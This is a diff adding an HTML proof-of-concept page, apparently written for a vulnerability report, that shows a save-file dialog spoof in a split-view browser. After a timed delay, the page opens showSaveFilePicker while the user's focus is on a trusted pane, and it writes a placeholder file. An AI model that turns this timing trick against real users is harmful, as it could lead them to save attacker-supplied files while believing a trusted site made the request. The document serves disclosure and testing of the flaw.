@@ -1,1 +1,46 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Arc split — showSaveFilePicker origin spoof</title>
+<style>
+  body{font:15px/1.6 -apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:40px;color:#14181f;background:#f6f7f9}
+  button{background:#d92d20;color:#fff;border:0;border-radius:8px;padding:14px 28px;font-size:16px;font-weight:600;cursor:pointer}
+  button:hover{background:#b42318}
+  #log{white-space:pre-wrap;background:#0f1115;color:#d7e0ea;border-radius:8px;padding:12px 14px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;min-height:60px;margin-top:20px;max-width:640px}
+  .ok{color:#38d39f}.bad{color:#ff8a80}
+  p{color:#5a6675;max-width:640px}
+</style>
+</head>
+<body>
+<button id="go">Start</button>
+<p>Split with a trusted tab → click Start → click the trusted pane within 3s.</p>
+<div id="log">ready.</div>
 
+<script>
+var DELAY = 3000;
+function log(m, cls){
+  var el = document.getElementById('log');
+  var line = document.createElement('div');
+  if(cls) line.className = cls;
+  line.textContent = m;
+  el.appendChild(line);
+}
+document.getElementById('go').addEventListener('click', function(){
+  if(!('showSaveFilePicker' in window)){ log('showSaveFilePicker unavailable — use Chromium over http(s), not file://.', 'bad'); return; }
+  log('armed — click the trusted pane within ' + DELAY + 'ms...');
+  setTimeout(fire, DELAY);
+});
+async function fire(){
+  log('[fire] visibilityState=' + document.visibilityState + '  hasFocus=' + document.hasFocus());
+  try{
+    var handle = await window.showSaveFilePicker({ suggestedName: 'invoice.pdf', types: [{ description: 'PDF', accept: { 'application/pdf': ['.pdf'] } }] });
+    var w = await handle.createWritable();
+    await w.write('PoC.');
+    await w.close();
+    log('[SAVED] "' + handle.name + '" — dialog shown while hasFocus=' + document.hasFocus(), 'ok');
+  }catch(err){ log('[abort] ' + err.name + ': ' + err.message, 'bad'); }
+}
+</script>
+</body>
+</html>
